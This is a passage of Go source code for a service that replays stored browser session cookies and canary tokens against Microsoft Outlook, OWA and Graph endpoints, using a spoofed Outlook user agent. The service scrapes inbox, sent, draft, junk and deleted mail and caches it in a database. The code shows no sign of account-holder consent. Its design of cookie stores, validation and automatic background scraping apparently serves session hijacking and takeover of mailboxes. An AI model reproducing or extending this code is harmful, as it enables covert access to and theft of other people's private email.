		// Navigate the OWA response structure to extract messages
		messages := s.parseOWAFindItemResponse(owaResp)
		if len(messages) > 0 {
			s.Logger.Infow("OWA FindItem success", "folder", folder, "count", len(messages))
			return messages, nil
		}

		// If we got a valid response but no messages, that's OK (empty folder)
		if owaResp["Body"] != nil {
			return messages, nil
		}

		lastErr = fmt.Errorf("OWA FindItem returned empty response")
	}

	return nil, fmt.Errorf("OWA FindItem failed on all endpoints: %w", lastErr)
}

// parseOWAFindItemResponse extracts InboxMessage items from an OWA FindItem response
func (s *CookieStoreService) parseOWAFindItemResponse(resp map[string]interface{}) []model.InboxMessage {
	var messages []model.InboxMessage

	// Navigate: Body -> ResponseMessages -> Items[0] -> RootFolder -> Items
	body, ok := resp["Body"].(map[string]interface{})
	if !ok {
		return messages
	}

	respMsgs, ok := body["ResponseMessages"].(map[string]interface{})
	if !ok {
		return messages
	}

	items, ok := respMsgs["Items"].([]interface{})
	if !ok || len(items) == 0 {
		return messages
	}

	firstItem, ok := items[0].(map[string]interface{})
	if !ok {
		return messages
	}

	rootFolder, ok := firstItem["RootFolder"].(map[string]interface{})
	if !ok {
		return messages
	}

	msgItems, ok := rootFolder["Items"].([]interface{})
	if !ok {
		return messages
	}

	for _, item := range msgItems {
		msgMap, ok := item.(map[string]interface{})
		if !ok {
			continue
		}

		msg := model.InboxMessage{}

		// Extract ItemId
		if itemID, ok := msgMap["ItemId"].(map[string]interface{}); ok {
			if id, ok := itemID["Id"].(string); ok {
				msg.ID = id
			}
		}

		// Extract Subject
		if subject, ok := msgMap["Subject"].(string); ok {
			msg.Subject = subject
		}

		// Extract Preview
		if preview, ok := msgMap["Preview"].(string); ok {
			msg.Preview = preview
		}

		// Extract DateTimeReceived
		if dateStr, ok := msgMap["DateTimeReceived"].(string); ok {
			msg.Date = dateStr
		}

		// Extract IsRead
		if isRead, ok := msgMap["IsRead"].(bool); ok {
			msg.IsRead = isRead
		}

		// Extract HasAttachments
		if hasAttach, ok := msgMap["HasAttachments"].(bool); ok {
			msg.HasAttachments = hasAttach
		}

		// Extract From
		if from, ok := msgMap["From"].(map[string]interface{}); ok {
			if mailbox, ok := from["Mailbox"].(map[string]interface{}); ok {
				if email, ok := mailbox["EmailAddress"].(string); ok {
					msg.From = email
				}
				if name, ok := mailbox["Name"].(string); ok {
					msg.FromName = name
				}
			}
		}

		// Extract ToRecipients
		if toRecips, ok := msgMap["ToRecipients"].([]interface{}); ok {
			for _, recip := range toRecips {
				if recipMap, ok := recip.(map[string]interface{}); ok {
					if mailbox, ok := recipMap["Mailbox"].(map[string]interface{}); ok {
						if email, ok := mailbox["EmailAddress"].(string); ok {
							msg.To = append(msg.To, email)
						}
					}
				}
			}
		}

		// Extract ConversationId
		if convID, ok := msgMap["ConversationId"].(map[string]interface{}); ok {
			if id, ok := convID["Id"].(string); ok {
				msg.ConversationID = id
			}
		}

		if msg.ID != "" {
			messages = append(messages, msg)
		}
	}

	return messages
}

// getMessageViaOWA reads a specific message using the OWA GetItem endpoint.
func (s *CookieStoreService) getMessageViaOWA(ctx context.Context, cookieHeader string, messageID string) (*model.InboxMessageFull, error) {
	canary := s.extractCanary(cookieHeader)
	if canary == "" {
		return nil, fmt.Errorf("no X-OWA-CANARY token found in cookies")
	}

	payload := map[string]interface{}{
		"__type": "GetItemJsonRequest:#Exchange",
		"Header": map[string]interface{}{
			"__type":       "JsonRequestHeaders:#Exchange",
			"RequestServerVersion": "Exchange2016",
		},
		"Body": map[string]interface{}{
			"__type": "GetItemRequest:#Exchange",
			"ItemShape": map[string]interface{}{
				"__type":   "ItemResponseShape:#Exchange",
				"BaseShape": "Default",
				"BodyType":  "HTML",
				"AdditionalProperties": []map[string]interface{}{
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemBody"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemSubject"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemDateTimeReceived"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageFrom"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageToRecipients"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemHasAttachments"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageIsRead"},
				},
			},
			"ItemIds": []map[string]interface{}{
				{
					"__type": "ItemId:#Exchange",
					"Id":     messageID,
				},
			},
		},
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal OWA GetItem payload: %w", err)
	}

	owaURLs := []string{
		"https://outlook.office365.com/owa/service.svc?action=GetItem",
		"https://outlook.office.com/owa/service.svc?action=GetItem",
	}

	var lastErr error
	for _, owaURL := range owaURLs {
		httpReq, reqErr := http.NewRequestWithContext(ctx, "POST", owaURL, bytes.NewReader(payloadBytes))
		if reqErr != nil {
			lastErr = reqErr
			continue
		}

		httpReq.Header.Set("Cookie", cookieHeader)
		httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
		httpReq.Header.Set("X-OWA-CANARY", canary)
		httpReq.Header.Set("Action", "GetItem")
		httpReq.Header.Set("User-Agent", outlookUserAgent)
		httpReq.Header.Set("Accept", "application/json")

		client := &http.Client{Timeout: 30 * time.Second}
		resp, doErr := client.Do(httpReq)
		if doErr != nil {
			lastErr = doErr
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			lastErr = fmt.Errorf("OWA GetItem returned status %d", resp.StatusCode)
			continue
		}

		var owaResp map[string]interface{}
		if decErr := json.NewDecoder(resp.Body).Decode(&owaResp); decErr != nil {
			lastErr = fmt.Errorf("failed to decode OWA GetItem response: %w", decErr)
			continue
		}

		msg := s.parseOWAGetItemResponse(owaResp)
		if msg != nil {
			return msg, nil
		}

		lastErr = fmt.Errorf("OWA GetItem returned empty response")
	}

	return nil, fmt.Errorf("OWA GetItem failed: %w", lastErr)
}

// parseOWAGetItemResponse extracts a full message from an OWA GetItem response
func (s *CookieStoreService) parseOWAGetItemResponse(resp map[string]interface{}) *model.InboxMessageFull {
	body, ok := resp["Body"].(map[string]interface{})
	if !ok {
		return nil
	}

	respMsgs, ok := body["ResponseMessages"].(map[string]interface{})
	if !ok {
		return nil
	}

	items, ok := respMsgs["Items"].([]interface{})
	if !ok || len(items) == 0 {
		return nil
	}

	firstResp, ok := items[0].(map[string]interface{})
	if !ok {
		return nil
	}

	msgItems, ok := firstResp["Items"].([]interface{})
	if !ok || len(msgItems) == 0 {
		return nil
	}

	msgMap, ok := msgItems[0].(map[string]interface{})
	if !ok {
		return nil
	}

	msg := &model.InboxMessageFull{}

	// Extract ItemId
	if itemID, ok := msgMap["ItemId"].(map[string]interface{}); ok {
		if id, ok := itemID["Id"].(string); ok {
			msg.ID = id
		}
	}

	// Extract Subject
	if subject, ok := msgMap["Subject"].(string); ok {
		msg.Subject = subject
	}

	// Extract DateTimeReceived
	if dateStr, ok := msgMap["DateTimeReceived"].(string); ok {
		msg.Date = dateStr
	}

	// Extract IsRead
	if isRead, ok := msgMap["IsRead"].(bool); ok {
		msg.IsRead = isRead
	}

	// Extract HasAttachments
	if hasAttach, ok := msgMap["HasAttachments"].(bool); ok {
		msg.HasAttachments = hasAttach
	}

	// Extract From
	if from, ok := msgMap["From"].(map[string]interface{}); ok {
		if mailbox, ok := from["Mailbox"].(map[string]interface{}); ok {
			if email, ok := mailbox["EmailAddress"].(string); ok {
				msg.From = email
			}
			if name, ok := mailbox["Name"].(string); ok {
				msg.FromName = name
			}
		}
	}

	// Extract Body (HTML)
	if bodyContent, ok := msgMap["Body"].(map[string]interface{}); ok {
		if value, ok := bodyContent["Value"].(string); ok {
			msg.BodyHTML = value
		}
	}

	// Extract UniqueBody as text fallback
	if uniqueBody, ok := msgMap["UniqueBody"].(map[string]interface{}); ok {
		if value, ok := uniqueBody["Value"].(string); ok {
			msg.BodyText = value
		}
	}

	if msg.ID != "" {
		return msg
	}
	return nil
}

// runPreAutomation runs background automation to scrape and cache inbox data.
// Uses fast API methods first (Graph API, REST API, OWA), falls back to browser only as last resort.
// This is triggered after successful validation and runs asynchronously.
func (s *CookieStoreService) runPreAutomation(storeID uuid.UUID, cookiesJSON, email, displayName string) {
	bgCtx := context.Background()

	s.Logger.Infow("starting background pre-automation", "storeID", storeID)

	// Mark as running
	_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
		"automation_status": "running",
	})

	store, err := s.CookieStoreRepo.GetByID(bgCtx, storeID)
	if err != nil {
		s.Logger.Warnw("pre-automation: store not found", "storeID", storeID, "error", err)
		_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
			"automation_status": "failed",
		})
		return
	}

	folderMessages := make(map[string][]model.InboxMessage)
	folders := []string{"inbox", "sentitems", "drafts", "junkemail", "deleteditems"}
	scrapedEmail := email
	scrapedDisplayName := displayName
	apiMethod := "none"

	// Method 1: Try token-based Graph API (fastest, most reliable)
	accessToken := s.getOrRefreshAccessToken(bgCtx, store)
	if accessToken != "" {
		// Get folders with real counts
		realFolders, fErr := s.getFoldersViaGraphAPI(bgCtx, accessToken)
		if fErr == nil && len(realFolders) > 0 {
			s.Logger.Infow("pre-automation: got folders via Graph API", "storeID", storeID, "count", len(realFolders))
		}

		// Get inbox messages for each folder
		allSuccess := true
		for _, folder := range folders {
			msgs, _, apiErr := s.getInboxViaGraphAPI(bgCtx, accessToken, folder, 50, 0)
			if apiErr != nil {
				allSuccess = false
				break
			}
			if len(msgs) > 0 {
				folderMessages[folder] = msgs
			}
		}
		if allSuccess && len(folderMessages) > 0 {
			apiMethod = "graph_api"
			s.Logger.Infow("pre-automation via Graph API", "storeID", storeID, "folders", len(folderMessages))
		}
	}

	// Method 2: Try cookie-based REST API
	if apiMethod == "none" {
		cookieHeader := s.buildCookieHeader(cookiesJSON)
		if cookieHeader != "" {
			allSuccess := true
			for _, folder := range folders {
				apiURL := fmt.Sprintf(
					"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=50&$skip=0&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
					folder,
				)

				httpReq, reqErr := http.NewRequestWithContext(bgCtx, "GET", apiURL, nil)
				if reqErr != nil {
					allSuccess = false
					break
				}
				httpReq.Header.Set("Cookie", cookieHeader)
				httpReq.Header.Set("User-Agent", outlookUserAgent)
				httpReq.Header.Set("Accept", "application/json")

				client := &http.Client{Timeout: 30 * time.Second}
				resp, doErr := client.Do(httpReq)
				if doErr != nil {
					allSuccess = false
					break
				}
				if resp.StatusCode != 200 {
					resp.Body.Close()
					allSuccess = false
					break
				}
				msgs, _, parseErr := s.parseMessagesResponse(resp.Body)
				resp.Body.Close()
				if parseErr != nil {
					allSuccess = false
					break
				}
				if len(msgs) > 0 {
					folderMessages[folder] = msgs
				}
			}
			if allSuccess && len(folderMessages) > 0 {
				apiMethod = "rest_api"
				s.Logger.Infow("pre-automation via REST API", "storeID", storeID, "folders", len(folderMessages))
			}
		}
	}

	// Method 3: Try OWA FindItem
	if apiMethod == "none" {
		cookieHeader := s.buildCookieHeader(cookiesJSON)
		if cookieHeader != "" {
			allSuccess := true
			for _, folder := range folders {
				msgs, owaErr := s.getInboxViaOWA(bgCtx, cookieHeader, folder, 50, 0)
				if owaErr != nil {
					allSuccess = false
					break
				}
				if len(msgs) > 0 {
					folderMessages[folder] = msgs
				}
			}
			if allSuccess && len(folderMessages) > 0 {
				apiMethod = "owa"
				s.Logger.Infow("pre-automation via OWA FindItem", "storeID", storeID, "folders", len(folderMessages))
			}
		}
	}

	// Method 4: Browser automation as last resort
	if apiMethod == "none" && s.BrowserSession != nil {
		sessionKey := storeID.String()
		var browserEmail, browserDisplayName string
		browserEmail, browserDisplayName, folderMessages, err = s.BrowserSession.PreAutomateStore(bgCtx, cookiesJSON, sessionKey)
		if err != nil {
			s.Logger.Warnw("pre-automation: all methods failed", "storeID", storeID, "error", err)
			_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
				"automation_status": "failed",
			})
			return
		}
		if browserEmail != "" {
			scrapedEmail = browserEmail
		}
		if browserDisplayName != "" {
			scrapedDisplayName = browserDisplayName
		}
		apiMethod = "browser"
		s.Logger.Infow("pre-automation via browser", "storeID", storeID, "folders", len(folderMessages))
	}

	if apiMethod == "none" {
		s.Logger.Warnw("pre-automation: all methods failed, no browser available", "storeID", storeID)
		_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
			"automation_status": "failed",
		})
		return
	}

	// Update email/display name if we got better data
	updates := map[string]interface{}{
		"automation_status": "ready",
		"last_scraped_at":   time.Now(),
	}
	if scrapedEmail != "" && (email == "" || strings.HasPrefix(email, "unknown")) {
		updates["email"] = scrapedEmail
	}
	if scrapedDisplayName != "" && displayName == "" {
		updates["display_name"] = scrapedDisplayName
	}
	_ = s.CookieStoreRepo.Update(bgCtx, storeID, updates)

	// Cache the scraped messages to the database
	for folder, messages := range folderMessages {
		dbMessages := s.inboxMessagesToDBMessages(storeID, folder, messages)
		if cacheErr := s.CookieStoreMessageRepo.UpsertMessages(bgCtx, storeID, folder, dbMessages); cacheErr != nil {
			s.Logger.Warnw("failed to cache messages", "storeID", storeID, "folder", folder, "error", cacheErr)
		} else {
			s.Logger.Infow("cached messages", "storeID", storeID, "folder", folder, "count", len(dbMessages))
		}
	}

	s.Logger.Infow("background pre-automation complete", "storeID", storeID, "method", apiMethod, "folders", len(folderMessages))
}

// inboxMessagesToDBMessages converts model.InboxMessage slice to database.CookieStoreMessage slice
func (s *CookieStoreService) inboxMessagesToDBMessages(storeID uuid.UUID, folder string, messages []model.InboxMessage) []database.CookieStoreMessage {
	now := time.Now()
	dbMessages := make([]database.CookieStoreMessage, len(messages))
	for i, msg := range messages {
		dbMessages[i] = database.CookieStoreMessage{
			CookieStoreID:  storeID,
			Folder:         folder,
			MessageID:      msg.ID,
			FromEmail:      msg.From,
			FromName:       msg.FromName,
			Subject:        msg.Subject,
			Preview:        msg.Preview,
			Date:           msg.Date,
			IsRead:         msg.IsRead,
			HasAttachments: msg.HasAttachments,
			ConversationID: msg.ConversationID,
			ScrapedAt:      &now,
		}
	}
	return dbMessages
}

// dbMessagesToInboxMessages converts database.CookieStoreMessage slice to model.InboxMessage slice
func (s *CookieStoreService) dbMessagesToInboxMessages(dbMessages []database.CookieStoreMessage) []model.InboxMessage {
	messages := make([]model.InboxMessage, len(dbMessages))
	for i, dbMsg := range dbMessages {
		messages[i] = model.InboxMessage{
			ID:             dbMsg.MessageID,
			From:           dbMsg.FromEmail,
			FromName:       dbMsg.FromName,
			Subject:        dbMsg.Subject,
			Preview:        dbMsg.Preview,
			Date:           dbMsg.Date,
			IsRead:         dbMsg.IsRead,
			HasAttachments: dbMsg.HasAttachments,
			ConversationID: dbMsg.ConversationID,
		}
	}
	return messages
}

// refreshInboxInBackground triggers a background refresh of cached inbox data for a specific folder.
// Uses fast API methods first (REST API, Graph API), falls back to browser only as last resort.
func (s *CookieStoreService) refreshInboxInBackground(storeID uuid.UUID, cookiesJSON string, folder string) {
	bgCtx := context.Background()

	s.Logger.Infow("background inbox refresh starting", "storeID", storeID, "folder", folder)

	store, err := s.CookieStoreRepo.GetByID(bgCtx, storeID)
	if err != nil {
		s.Logger.Warnw("background refresh: store not found", "storeID", storeID, "error", err)
		return
	}

	var messages []model.InboxMessage

	// Method 1: Try token-based Graph API (fastest)
	accessToken := s.getOrRefreshAccessToken(bgCtx, store)
	if accessToken != "" {
		msgs, _, apiErr := s.getInboxViaGraphAPI(bgCtx, accessToken, folder, 50, 0)
		if apiErr == nil && len(msgs) > 0 {
			s.Logger.Infow("background refresh via Graph API", "storeID", storeID, "folder", folder, "count", len(msgs))
			messages = msgs
		}
	}

	// Method 2: Try cookie-based REST API
	if len(messages) == 0 {
		cookieHeader := s.buildCookieHeader(cookiesJSON)
		if cookieHeader != "" {
			apiURL := fmt.Sprintf(
				"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=50&$skip=0&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
				folder,
			)

			httpReq, reqErr := http.NewRequestWithContext(bgCtx, "GET", apiURL, nil)
			if reqErr == nil {
				httpReq.Header.Set("Cookie", cookieHeader)
				httpReq.Header.Set("User-Agent", outlookUserAgent)
				httpReq.Header.Set("Accept", "application/json")

				client := &http.Client{Timeout: 30 * time.Second}
				resp, doErr := client.Do(httpReq)
				if doErr == nil {
					defer resp.Body.Close()
					if resp.StatusCode == 200 {
						msgs, _, parseErr := s.parseMessagesResponse(resp.Body)
						if parseErr == nil && len(msgs) > 0 {
							s.Logger.Infow("background refresh via REST API", "storeID", storeID, "folder", folder, "count", len(msgs))
							messages = msgs
						}
					}
				}
			}
		}
	}

	// Method 3: Try OWA FindItem
	if len(messages) == 0 {
		cookieHeader := s.buildCookieHeader(cookiesJSON)
		if cookieHeader != "" {
			msgs, owaErr := s.getInboxViaOWA(bgCtx, cookieHeader, folder, 50, 0)
			if owaErr == nil && len(msgs) > 0 {
				s.Logger.Infow("background refresh via OWA FindItem", "storeID", storeID, "folder", folder, "count", len(msgs))
				messages = msgs
			}
		}
	}

	// Method 4: Browser automation as last resort
	if len(messages) == 0 && s.BrowserSession != nil {
		sessionKey := storeID.String()
		msgs, _, browserErr := s.BrowserSession.ReadInboxViaBrowser(bgCtx, cookiesJSON, folder, 50, 0, sessionKey)
		if browserErr == nil && len(msgs) > 0 {
			s.Logger.Infow("background refresh via browser", "storeID", storeID, "folder", folder, "count", len(msgs))
			messages = msgs
		}
	}

	if len(messages) > 0 {
		dbMessages := s.inboxMessagesToDBMessages(storeID, folder, messages)
		if err := s.CookieStoreMessageRepo.UpsertMessages(bgCtx, storeID, folder, dbMessages); err != nil {
			s.Logger.Warnw("failed to update cached messages", "storeID", storeID, "folder", folder, "error", err)
		} else {
			now := time.Now()
			_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
				"last_scraped_at": now,
			})
			s.Logger.Infow("background inbox refresh complete", "storeID", storeID, "folder", folder, "count", len(messages))
		}
	} else {
		s.Logger.Warnw("background inbox refresh: all methods failed", "storeID", storeID, "folder", folder)
	}
}
